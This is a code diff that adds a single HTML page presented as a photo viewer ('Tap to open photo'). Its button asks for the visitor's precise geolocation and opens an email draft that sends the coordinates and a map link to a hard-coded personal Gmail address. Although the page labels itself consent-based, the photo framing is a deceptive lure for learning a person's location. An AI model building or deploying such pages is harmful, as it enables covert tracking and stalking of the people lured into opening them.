@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Open Photo</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #0f172a;
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .card {
+      width: 100%;
+      max-width: 460px;
+      background: #111827;
+      border-radius: 18px;
+      overflow: hidden;
+      box-shadow: 0 18px 50px rgba(0,0,0,.35);
+      border: 1px solid rgba(255,255,255,.08);
+    }
+    .hero {
+      height: 280px;
+      background:
+        linear-gradient(135deg, rgba(59,130,246,.8), rgba(147,51,234,.7)),
+        url('https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?auto=format&fit=crop&w=1200&q=80') center/cover no-repeat;
+      display: flex;
+      align-items: end;
+      padding: 20px;
+    }
+    .hero h1 {
+      margin: 0;
+      font-size: 28px;
+      line-height: 1.1;
+    }
+    .content {
+      padding: 20px;
+    }
+    .notice {
+      background: #1e293b;
+      border: 1px solid rgba(255,255,255,.08);
+      color: #dbeafe;
+      border-radius: 12px;
+      padding: 12px 14px;
+      margin-bottom: 16px;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+    .btn {
+      width: 100%;
+      padding: 14px 16px;
+      border: 0;
+      border-radius: 12px;
+      background: #2563eb;
+      color: white;
+      font-size: 17px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .btn:hover { opacity: .96; }
+    pre {
+      margin-top: 16px;
+      background: #020617;
+      color: #e5e7eb;
+      padding: 14px;
+      border-radius: 12px;
+      white-space: pre-wrap;
+      word-break: break-word;
+      min-height: 90px;
+      border: 1px solid rgba(255,255,255,.08);
+    }
+    .small {
+      color: #94a3b8;
+      font-size: 13px;
+      margin-top: 12px;
+      line-height: 1.5;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="hero">
+      <h1>Tap to open photo</h1>
+    </div>
+
+    <div class="content">
+      <div class="notice">
+        This page asks the visitor for permission to share their location.
+        If they allow it, an email draft opens to <strong>hejazi.a84@gmail.com</strong>
+        with the approved location details.
+      </div>
+
+      <button class="btn" onclick="shareLocation()">Open Photo</button>
+
+      <pre id="status">Waiting...</pre>
+
+      <div class="small">
+        This is a consent-based page for hosting online over HTTPS.
+        It cannot silently send anything without the visitor's permission.
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const recipient = "hejazi.a84@gmail.com";
+
+    function setStatus(text) {
+      document.getElementById("status").textContent = text;
+    }
+
+    function shareLocation() {
+      if (!navigator.geolocation) {
+        setStatus("Geolocation is not supported by this browser.");
+        return;
+      }
+
+      setStatus("Requesting location permission...");
+
+      navigator.geolocation.getCurrentPosition(
+        function(pos) {
+          const lat = pos.coords.latitude;
+          const lng = pos.coords.longitude;
+          const accuracy = pos.coords.accuracy;
+          const mapsLink = `https://maps.google.com/?q=${lat},${lng}`;
+
+          const body =
+            `The user approved location sharing.\n\n` +
+            `Latitude: ${lat}\n` +
+            `Longitude: ${lng}\n` +
+            `Accuracy: ${accuracy} meters\n` +
+            `Map: ${mapsLink}`;
+
+          setStatus(
+            `Location approved.\n\n` +
+            `Latitude: ${lat}\n` +
+            `Longitude: ${lng}\n` +
+            `Accuracy: ${accuracy} meters\n` +
+            `Map: ${mapsLink}\n\n` +
+            `Opening email draft...`
+          );
+
+          const mailto =
+            `mailto:${encodeURIComponent(recipient)}` +
+            `?subject=${encodeURIComponent("Shared location")}` +
+            `&body=${encodeURIComponent(body)}`;
+
+          window.location.href = mailto;
+        },
+        function(err) {
+          setStatus("Location error: " + err.message);
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    }
+  </script>
+</body>
+</html>
